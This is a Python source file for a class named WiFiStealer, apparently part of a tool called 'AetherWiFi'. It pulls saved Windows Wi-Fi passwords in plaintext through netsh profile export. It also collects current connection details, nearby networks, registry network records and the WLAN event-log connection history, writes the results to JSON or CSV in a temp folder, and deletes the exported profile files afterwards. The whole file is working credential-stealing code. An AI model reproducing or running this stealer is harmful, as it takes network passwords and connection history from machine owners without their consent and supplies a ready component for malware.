import subprocess, os, re, json, hashlib, base64
from datetime import datetime
import xml.etree.ElementTree as ET

class WiFiStealer:
    def __init__(self):
        self.profiles_dir = os.path.join(os.environ['TEMP'], 'AetherWiFi')
        os.makedirs(self.profiles_dir, exist_ok=True)
        
    def extract_all(self):
        """Extract all saved WiFi passwords."""
        results = {
            'current_connection': self.get_current_connection(),
            'saved_profiles': self.get_saved_profiles(),
            'available_networks': self.get_available_networks(),
            'preferred_networks': self.get_preferred_networks(),
            'wifi_history': self.get_wifi_history()
        }
        
        return results
    
    def get_current_connection(self):
        """Get current WiFi connection details."""
        try:
            # Use netsh to get current connection
            cmd = ['netsh', 'wlan', 'show', 'interfaces']
            output = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
            
            connection = {}
            
            lines = output.split('\n')
            for line in lines:
                line = line.strip()
                
                if 'SSID' in line and 'BSSID' not in line:
                    connection['ssid'] = line.split(':')[1].strip()
                elif 'Signal' in line:
                    connection['signal'] = line.split(':')[1].strip()
                elif 'Radio type' in line:
                    connection['radio_type'] = line.split(':')[1].strip()
                elif 'Channel' in line:
                    connection['channel'] = line.split(':')[1].strip()
                elif 'Authentication' in line:
                    connection['authentication'] = line.split(':')[1].strip()
                elif 'Connection mode' in line:
                    connection['mode'] = line.split(':')[1].strip()
            
            # Get IP info
            ip_cmd = ['ipconfig']
            ip_output = subprocess.run(ip_cmd, capture_output=True, text=True, shell=True).stdout
            
            # Parse IP info
            for block in ip_output.split('\n\n'):
                if 'Wireless LAN adapter' in block or 'Wi-Fi' in block:
                    for line in block.split('\n'):
                        if 'IPv4 Address' in line:
                            connection['ip'] = line.split(':')[1].strip().replace('(Preferred)', '')
                        elif 'Default Gateway' in line:
                            connection['gateway'] = line.split(':')[1].strip()
            
            return connection
            
        except Exception as e:
            return {'error': str(e)}
    
    def get_saved_profiles(self):
        """Get all saved WiFi profiles with passwords."""
        profiles = []
        
        try:
            # Get list of profiles
            cmd = ['netsh', 'wlan', 'show', 'profiles']
            output = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
            
            # Extract profile names
            profile_names = []
            in_section = False
            
            for line in output.split('\n'):
                line = line.strip()
                
                if 'User profiles' in line:
                    in_section = True
                    continue
                
                if in_section and 'All User Profile' in line:
                    profile_name = line.split(':')[1].strip()
                    profile_names.append(profile_name)
            
            # Get password for each profile
            for profile_name in profile_names:
                try:
                    profile = self.get_profile_details(profile_name)
                    if profile:
                        profiles.append(profile)
                except:
                    continue
            
            return profiles
            
        except Exception as e:
            return [{'error': str(e)}]
    
    def get_profile_details(self, profile_name):
        """Get details for a specific profile, including password."""
        try:
            # Export profile to XML
            export_cmd = ['netsh', 'wlan', 'export', 'profile', f'name="{profile_name}"', 'key=clear', 
                         'folder=' + self.profiles_dir]
            subprocess.run(export_cmd, capture_output=True, shell=True)
            
            # Find the XML file
            xml_file = None
            for file in os.listdir(self.profiles_dir):
                if file.startswith('Wi-Fi-') and file.endswith('.xml'):
                    # Check if this is the right profile
                    with open(os.path.join(self.profiles_dir, file), 'r', encoding='utf-8') as f:
                        content = f.read()
                        if f'name="{profile_name}"' in content or f'<name>{profile_name}</name>' in content:
                            xml_file = os.path.join(self.profiles_dir, file)
                            break
            
            if not xml_file:
                return None
            
            # Parse XML
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            profile_info = {
                'name': profile_name,
                'filename': os.path.basename(xml_file)
            }
            
            # Extract SSID
            ssid_config = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}SSIDConfig')
            if ssid_config is not None:
                ssid = ssid_config.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}name')
                if ssid is not None:
                    profile_info['ssid'] = ssid.text
            
            # Extract connection type
            connection_type = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}connectionType')
            if connection_type is not None:
                profile_info['connection_type'] = connection_type.text
            
            # Extract authentication
            auth = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}authentication')
            if auth is not None:
                profile_info['authentication'] = auth.text
            
            # Extract encryption
            encryption = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}encryption')
            if encryption is not None:
                profile_info['encryption'] = encryption.text
            
            # Try to extract password
            shared_key = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}sharedKey')
            if shared_key is not None:
                key_material = shared_key.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}keyMaterial')
                if key_material is not None and key_material.text:
                    profile_info['password'] = key_material.text
                else:
                    # Check for protected password
                    protected = shared_key.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}protected')
                    if protected is not None and protected.text == 'true':
                        profile_info['password_protected'] = True
            
            # Extract MAC randomization settings (Windows 10+)
            mac_randomization = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}macRandomization')
            if mac_randomization is not None:
                profile_info['mac_randomization'] = mac_randomization.text
            
            # Clean up XML file
            try:
                os.remove(xml_file)
            except:
                pass
            
            return profile_info
            
        except Exception as e:
            return {'name': profile_name, 'error': str(e)}
    
    def get_available_networks(self):
        """Scan for available WiFi networks."""
        networks = []
        
        try:
            cmd = ['netsh', 'wlan', 'show', 'networks', 'mode=bssid']
            output = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
            
            current_ssid = None
            current_network = {}
            
            lines = output.split('\n')
            for line in lines:
                line = line.strip()
                
                if 'SSID' in line and 'BSSID' not in line and ':' in line:
                    # New network
                    if current_network:
                        networks.append(current_network.copy())
                    
                    ssid = line.split(':')[1].strip()
                    current_network = {
                        'ssid': ssid,
                        'bssids': []
                    }
                    current_ssid = ssid
                
                elif 'BSSID' in line and current_ssid:
                    bssid = line.split(':')[1].strip()
                    current_network['bssids'].append(bssid)
                
                elif 'Signal' in line and current_ssid:
                    signal = line.split(':')[1].strip()
                    if 'bssids' in current_network and current_network['bssids']:
                        current_network['bssids'][-1] = {
                            'mac': current_network['bssids'][-1],
                            'signal': signal
                        }
                
                elif 'Channel' in line and current_ssid:
                    channel = line.split(':')[1].strip()
                    if 'bssids' in current_network and isinstance(current_network['bssids'][-1], dict):
                        current_network['bssids'][-1]['channel'] = channel
            
            # Add last network
            if current_network:
                networks.append(current_network)
            
            return networks
            
        except Exception as e:
            return [{'error': str(e)}]
    
    def get_preferred_networks(self):
        """Get preferred network order from registry."""
        preferred = []
        
        try:
            import winreg
            
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            
            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, subkey_name)
                    
                    try:
                        profile_name = winreg.QueryValueEx(subkey, "Description")[0]
                        first_network = winreg.QueryValueEx(subkey, "FirstNetwork")[0]
                        dns_suffix = winreg.QueryValueEx(subkey, "DnsSuffix")[0]
                        
                        preferred.append({
                            'profile_name': profile_name,
                            'first_network': first_network,
                            'dns_suffix': dns_suffix,
                            'key': subkey_name
                        })
                    except:
                        pass
                    
                    winreg.CloseKey(subkey)
                    i += 1
                
                except WindowsError:
                    break
            
            winreg.CloseKey(key)
            
            return preferred
            
        except Exception as e:
            return [{'error': str(e)}]
    
    def get_wifi_history(self):
        """Get WiFi connection history."""
        history = []
        
        try:
            # Check event logs for WiFi connections
            cmd = [
                'wevtutil', 'qe', 'Microsoft-Windows-WLAN-AutoConfig/Operational',
                '/rd:true', '/c:100',
                '/q:"*[System[(EventID=8001 or EventID=8002 or EventID=8003)]]"'
            ]
            
            output = subprocess.run(cmd, capture_output=True, text=True, shell=True).stdout
            
            # Parse XML events
            events = output.split('</Event>')
            
            for event_xml in events:
                if not event_xml.strip():
                    continue
                
                try:
                    event_xml = event_xml + '</Event>'
                    root = ET.fromstring(event_xml)
                    
                    # Extract event data
                    system = root.find('.//{http://schemas.microsoft.com/win/2004/08/events/event}System')
                    event_data = root.find('.//{http://schemas.microsoft.com/win/2004/08/events/event}EventData')
                    
                    if system is not None and event_data is not None:
                        time_created = system.find('.//{http://schemas.microsoft.com/win/2004/08/events/event}TimeCreated')
                        event_id = system.find('.//{http://schemas.microsoft.com/win/2004/08/events/event}EventID')
                        
                        data_items = {}
                        for data in event_data.findall('.//{http://schemas.microsoft.com/win/2004/08/events/event}Data'):
                            name = data.get('Name')
                            if name:
                                data_items[name] = data.text
                        
                        history.append({
                            'timestamp': time_created.get('SystemTime') if time_created is not None else None,
                            'event_id': event_id.text if event_id is not None else None,
                            'ssid': data_items.get('SSID'),
                            'interface': data_items.get('Interface'),
                            'reason': data_items.get('Reason'),
                            'error': data_items.get('Error')
                        })
                
                except:
                    continue
            
            return history
            
        except Exception as e:
            return [{'error': str(e)}]
    
    def export_profiles(self, format='json'):
        """Export all profiles in specified format."""
        profiles = self.get_saved_profiles()
        
        if format.lower() == 'json':
            output_file = os.path.join(self.profiles_dir, 'wifi_profiles.json')
            with open(output_file, 'w') as f:
                json.dump(profiles, f, indent=2)
            
            return output_file
        
        elif format.lower() == 'csv':
            output_file = os.path.join(self.profiles_dir, 'wifi_profiles.csv')
            
            with open(output_file, 'w', newline='', encoding='utf-8') as f:
                import csv
                
                if profiles and len(profiles) > 0:
                    # Get all possible fieldnames
                    fieldnames = set()
                    for profile in profiles:
                        if isinstance(profile, dict):
                            fieldnames.update(profile.keys())
                    
                    writer = csv.DictWriter(f, fieldnames=list(fieldnames))
                    writer.writeheader()
                    
                    for profile in profiles:
                        if isinstance(profile, dict):
                            writer.writerow(profile)
            
            return output_file
        
        else:
            return None